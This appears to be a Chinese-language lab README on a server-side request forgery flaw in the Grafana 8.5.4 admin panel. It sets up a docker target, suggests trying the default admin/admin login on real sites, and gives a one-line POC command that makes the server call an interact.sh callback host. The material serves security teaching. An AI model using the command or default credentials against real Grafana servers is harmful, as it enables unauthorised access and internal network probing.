# Grafana 管理后台 SSRF

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞编号** | Grafana Admin SSRF |
| **影响版本** | Grafana 8.5.4 |
| **漏洞类型** | 服务器端请求伪造（SSRF） |
| **危险等级** | 🔴 高危 |
| **默认端口** | 3000 |

## 漏洞描述

Grafana 是一个开源的度量分析与可视化套件。在其管理后台中存在一个功能，攻击者可以用于向任意地址发送 HTTP 请求，且支持自定义 HTTP Header。

参考链接：

- [grafana-ssrf - GitHub](https://github.com/RandomRobbieBF/grafana-ssrf)

## 漏洞环境

执行如下命令启动一个 Grafana 8.5.4：

```
docker compose up -d
```

环境启动后，访问 `http://your-ip:3000` 即可查看到管理后台。这个管理后台是不需要登录的，因为 Vulhub 环境设置了匿名用户的权限：

```ini
[auth.anonymous]
enabled = true
org_role = Admin
```

在真实场景中，如果你没有权限访问管理界面，可以尝试使用默认账号密码 `admin` 和 `admin`，只有能够成功登录后台的用户才能利用这个漏洞。

## 漏洞复现

使用 [这个 POC](https://github.com/RandomRobbieBF/grafana-ssrf) 来复现 SSRF 漏洞：

```
python grafana-ssrf.py -H http://your-ip:3000 -u http://example.interact.sh/attack
```

![SSRF POC 执行](https://static.nextcyber.cn/attachments/images/course/task/a3f66f4f5ad84d0d9a1628011bb767c9.png)

可见，我们的反连平台已成功收到了 HTTP 请求：

![反连平台接收请求](https://static.nextcyber.cn/attachments/images/course/task/c573a4f3d95c497ab719f7b8b3da5b3e.png)


---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/83) 在线实战演练此漏洞。

---

> ⚠️ **免责声明**：本目录所有内容仅供学习研究使用，请勿用于非法用途。
